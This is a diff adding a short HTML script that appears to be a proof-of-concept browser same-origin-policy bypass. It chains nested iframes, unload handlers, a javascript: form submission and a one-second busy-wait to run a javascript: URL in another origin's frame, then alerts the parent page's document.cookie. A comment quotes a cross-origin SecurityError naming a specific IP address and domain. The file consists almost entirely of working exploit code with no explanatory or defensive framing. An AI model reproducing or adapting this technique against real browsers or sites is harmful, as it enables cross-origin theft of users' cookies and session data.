@@ -1,0 +1,38 @@
+﻿<script>
+    // this will show error correctly
+    //Uncaught SecurityError: Blocked a frame with origin "http://100.85.133.144" from accessing a frame with origin "http://www.uc123.com". The frame being accessed set "document.domain" to "uc123.com", but the frame requesting access did not. Both must set "document.domain" to the same value to allow access.
+    // alert(parent.document.cookie);
+    var x = top.x;
+
+    var d = x.contentDocument;
+    var x1 = d.createElement('iframe');
+    x1.src = 'about:blank#';
+    d.documentElement.appendChild(x1);
+    x1.contentWindow.onunload = function () {
+        x1.contentWindow.onunload = null;
+        x.contentWindow.onload = function () {
+            x.contentWindow.onunload = function () {
+                var f = d.createElement('form');
+                f.action = 'javascript:""';
+                f.submit();
+                var x2 = x.contentDocument.createElement('iframe');
+                x.contentDocument.body.appendChild(x2);
+                x2.contentWindow.onunload = function () {
+                    x.contentDocument.body.appendChild(x1);
+                }
+            }
+            var a = x.contentDocument.createElement('a');
+            a.href = 'about:blank';
+            a.click();
+            a = x1.contentDocument.createElement('a');
+            a.href = 'about:blank';
+            a.click();
+        }
+        x1.src = "javascript:setTimeout(function(){alert(parent.parent.document.cookie)}, 1)";
+    }
+    x1.src = 'data:text/html,';
+    var t = Date.now();
+    // this ensures that x1.contentWindow.onunload fires before this.onload
+    while (Date.now() - t < 1000) {
+    }
+</script>
